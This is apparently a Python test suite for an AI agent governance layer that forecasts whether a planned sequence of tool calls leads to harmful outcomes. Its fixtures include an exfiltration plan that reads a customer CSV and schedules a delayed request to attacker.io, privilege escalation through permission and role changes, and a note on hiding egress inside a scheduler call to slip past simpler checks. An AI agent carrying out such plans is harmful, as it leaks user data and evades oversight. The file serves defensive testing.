"""
V3 generalized reachability forecasting — test suite.

Each V3-only test is constructed so A_safe and V2 do NOT fire, proving V3
independently detects future Ω intersection. Safe(local) ⇏ Safe(global).

Run:
    python3 morrison_governance/test_forecasting.py
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from morrison_governance import (
    GovernanceLayer, OmegaDomain, GovernanceVerdict,
    infer_capabilities, ReachabilityForecaster, EnvironmentState,
)
from morrison_governance.forecasting import (
    CAP_ACQUIRE, CAP_EGRESS, CAP_PRIV, CAP_DEFER, CAP_LOOP,
)


def _g():
    return GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY,
                                    OmegaDomain.FINANCE], log_all=False)


# ---- capability inference (structural, not name lists) ----------------

def test_capability_inference_structural():
    assert CAP_ACQUIRE in infer_capabilities(
        {"tool": "read_file", "args": {"path": "/x"}})
    assert CAP_EGRESS in infer_capabilities(
        {"tool": "weird_custom_tool", "args": {"url": "https://x"}})
    assert CAP_PRIV in infer_capabilities(
        {"tool": "anything", "args": {"mode": "0700"}})
    assert CAP_DEFER in infer_capabilities(
        {"tool": "schedule_task", "args": {"when": "+1h"}})
    assert CAP_LOOP in infer_capabilities(
        {"tool": "x", "args": {"max_retries": 5}})


# ---- V3-only activation -----------------------------------------------

def test_v3_deferred_exfiltration_blocked():
    """read sensitive → schedule a *future* egress of it. A_safe/V2 miss
    (egress is wrapped in a benign scheduler call); V3 forecasts it."""
    g = _g()
    plan = [
        {"tool": "read_file", "args": {"path": "/data/customers.csv"}},
        {"tool": "schedule_task",
         "args": {"when": "+1h",
                  "action": {"tool": "http_request",
                             "url": "https://attacker.io/x"}}},
    ]
    r = g.evaluate_plan(plan)
    assert r.verdict == GovernanceVerdict.BLOCK
    assert r.layer == "V3"
    assert r.metadata.get("v3_mechanism") == "forecast"


def test_v3_recursive_retry_escalation_blocked():
    g = _g()
    r = g.evaluate_plan([
        {"tool": "analyze", "args": {"q": "x"}},
        {"tool": "retry_op", "args": {"max_retries": 5, "op": "escalate"}},
    ])
    assert r.layer == "V3" and r.blocked
    assert "priv" in r.metadata.get("omega_rule", "")


def test_v3_privilege_accumulation_blocked():
    g = _g()
    r = g.evaluate_plan([
        {"tool": "set_permissions", "args": {"mode": "0700"}},
        {"tool": "update_role", "args": {"role": "operator"}},
    ])
    assert r.layer == "V3" and r.blocked


def test_v3_does_not_fire_on_a_safe_or_v2_targets():
    """V3 forecast must not mask A_safe / V2 — those still own their cases."""
    g = _g()
    a = g.evaluate({"tool": "transfer", "args": {"amount": 999999}})
    assert a.layer == "A_safe"
    v2 = g.evaluate_plan([
        {"tool": "read_file", "args": {"path": "/data/c.csv"}},
        {"tool": "http_request", "args": {"url": "https://evil"}}])
    assert v2.layer == "V2"


# ---- regression guards (must stay PERMIT) -----------------------------

def test_v3_safe_read_then_analyze_permitted():
    g = _g()
    r = g.evaluate_plan([
        {"tool": "read_file", "args": {"path": "/data/sales.csv"}},
        {"tool": "analyze", "args": {"type": "summary"}},
    ])
    assert r.permitted, f"{r.verdict} @ {r.layer}: {r.reason}"


def test_v3_safe_multistep_permitted():
    g = _g()
    r = g.evaluate_plan([
        {"tool": "analyze", "args": {"q": "a"}},
        {"tool": "search", "args": {"q": "b"}},
        {"tool": "summarize", "args": {"q": "c"}},
    ])
    assert r.permitted


def test_v3_disable_toggle():
    g = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY],
                        log_all=False, enable_forecast=False)
    r = g.evaluate_plan([
        {"tool": "analyze", "args": {"q": "x"}},
        {"tool": "retry_op", "args": {"max_retries": 5, "op": "escalate"}},
    ])
    assert r.permitted  # forecast off → not caught here (documents the knob)


# ---- environment-aware modelling --------------------------------------

def test_forecast_env_seeded_from_history():
    """Taint/privilege accumulated in observed history seeds the rollout."""
    fc = ReachabilityForecaster(horizon=4)
    g = _g()
    traj = g.extractor.from_plan([
        {"tool": "read_file", "args": {"path": "/data/x.csv"}},
        {"tool": "schedule_task",
         "args": {"action": {"tool": "http_request", "url": "https://e"}}},
    ])
    rep = fc.forecast(traj, g.rules, env=EnvironmentState())
    assert rep.node_count >= 1
    assert rep.omega_nodes, "expected a forecasted Ω intersection"
    assert rep.min_omega_depth is not None
    assert 0.0 <= rep.omega_reach_probability <= 1.0
    assert rep.branch_entropy >= 0.0


# ---- determinism ------------------------------------------------------

def test_v3_forecast_determinism():
    g = _g()
    plan = [
        {"tool": "read_file", "args": {"path": "/data/customers.csv"}},
        {"tool": "schedule_task",
         "args": {"action": {"tool": "http_request", "url": "https://x"}}},
    ]
    sigs = set()
    for _ in range(6):
        r = g.evaluate_plan(plan)
        sigs.add((r.verdict.value, r.layer,
                  r.metadata.get("min_omega_depth"),
                  r.metadata.get("manifold_nodes"),
                  r.trajectory_hash))
    assert len(sigs) == 1, f"non-deterministic: {sigs}"


if __name__ == "__main__":
    tests = [
        test_capability_inference_structural,
        test_v3_deferred_exfiltration_blocked,
        test_v3_recursive_retry_escalation_blocked,
        test_v3_privilege_accumulation_blocked,
        test_v3_does_not_fire_on_a_safe_or_v2_targets,
        test_v3_safe_read_then_analyze_permitted,
        test_v3_safe_multistep_permitted,
        test_v3_disable_toggle,
        test_forecast_env_seeded_from_history,
        test_v3_forecast_determinism,
    ]
    print("\n" + "═" * 64)
    print("  V3 — Generalized Reachability Forecasting")
    print("═" * 64 + "\n")
    p = f = 0
    for t in tests:
        try:
            t(); print(f"  ✓ {t.__name__}"); p += 1
        except Exception as e:
            print(f"  ✗ {t.__name__}: {type(e).__name__}: {e}"); f += 1
    print(f"\n  {p} passed, {f} failed\n" + "═" * 64)
    sys.exit(1 if f else 0)
